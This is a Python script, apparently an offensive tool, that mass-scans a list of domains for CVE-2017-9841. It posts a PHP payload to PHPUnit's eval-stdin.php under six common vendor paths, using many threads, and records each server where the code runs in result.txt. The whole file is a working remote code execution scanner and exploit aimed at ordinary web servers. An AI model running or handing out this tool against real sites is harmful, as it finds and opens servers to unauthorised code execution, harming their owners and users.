#!/usr/bin/env python3
import requests
import os
import re
import pyfiglet
from colorama import Fore, init
from multiprocessing.dummy import Pool as ThreadPool

# Color
green = Fore.LIGHTGREEN_EX
red = Fore.LIGHTRED_EX
white = Fore.WHITE
cyan = Fore.LIGHTCYAN_EX
yellow = Fore.LIGHTYELLOW_EX

init(autoreset=True)

phpfiles = ["/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "/yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "/laravel52/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "/zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"]

def banner():
    os.system("cls||clear")
    __banner__ = pyfiglet.figlet_format("CVE-2017-9841", font="slant", justify="center")
    print(red + __banner__)
    print(f"\t\t\t{red}[ {white}Created By X - MrG3P5 {red}]")
    print(f"\t    {red}[ {white}Remote Code Execution (RCE) (Unauthenticated) {red}]\n")


def Exploit(domain):
    try:
        vuln = False
        for x in phpfiles:
            site = "http://" + domain + x
            req = requests.get(site, headers={
                "Content-Type" : "text/html",
                "User-Agent" : f"Mozilla/5.0 (X11; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0",
            }, data="<?php echo md5(phpunit_rce); ?>")

            if "6dd70f16549456495373a337e6708865" in req.text:
                vuln = True
            else:
                pass

        if vuln:
            print(f"{white}--> {green}Vulnerable: {domain}")
            open("result.txt", "a").write(site + "\n")
        else:
            print(f"{white}--> {red}Not Vulnerable: {domain}")
    except:
        print(f"{white}--> {red}Not Vulnerable: {domain}")


if __name__=="__main__":
    banner()
    input_list = open(input(f"{red}[{white}?{red}] {white}Domain List : ")).read().replace("http://", "").replace("https://", "").replace(".php", "")
    domain_fixer = re.findall(r'(?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]{,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,6}', input_list)
    Thread = input(f"{red}[{white}?{red}] {white}Thread : ")
    pool = ThreadPool(int(Thread))
    pool.map(Exploit, domain_fixer)
    pool.close()
    pool.join()
